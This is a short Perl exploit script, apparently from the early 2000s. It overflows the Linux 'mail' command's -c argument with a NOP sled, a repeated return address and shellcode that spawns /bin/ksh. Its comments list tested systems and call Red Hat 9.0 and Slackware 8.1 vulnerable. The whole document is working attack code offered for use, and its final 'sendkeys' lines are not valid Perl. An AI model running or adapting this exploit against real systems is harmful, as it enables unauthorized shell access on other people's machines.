#!/usr/bin/perl
#
#
# Released under the GPL by a bored Vulndev member
# email: mark@vulndev.org
#
# The User 'cannot have expectations of privacy'. 
#
# For the Script to work you will need to:
# Run it, press 'return' once, then '.' then 'return'
#result = Shell (if you have /bin/ksh!)
#
# Anything you do with this script is your own problem,
# dont forget if you print it off, recycle!
# if you dont print it off, do so anyway 
# and use if for expensive toilet paper.
# 
# Systems Tested on: (Please let me know the outcome of your own box)
# Redhat 9.0 -- Vulnerable
# Redhat 9.0 with St Jude and St Michael -- Not Vulnerable
# Slackware 8.1 -- Vulnerable
# Slackware 9.0 -- Not Vulnerable
# Debian 3.0 (Testing) -- May be vulnerable.. needing comfirmation.
$shellcode = 
"\xeb\x1f\x5f\x89\xfc\x66\xf7\xd4\x31\xc0\x8a\x07".
"\x47\x57\xae\x75\xfd\x88\x67\xff\x48\x75\xf6\x5b".
"\x53\x50\x5a\x89\xe1\xb0\x0b\xcd\x80\xe8\xdc\xff".
"\xff\xff\x01\x2f\x62\x69\x6e\x2f\x6b\x73\x68\x01".
"";
$ret = 0xbffff714;
$buf = 8232;
$egg = 9000;
$nop = "\x90";
$offset = 0;
if (@ARGV == 1) 
{ 
$offset = $ARGV[0];
}
$addr = pack('l',($ret + $offset));
for ($i = 0; $i < $buf; $i += 4)
{
$buffer .= $addr;
}
for ($i = 0; $i < ($egg - length($shellcode) - 100); $i++) 
{
 $buffer .= $nop;
}
$buffer .= $shellcode;
exec("mail",'-s','Test','-c',$buffer,'root@localhost');
sendkeys("{CR}");
sendkeys(".");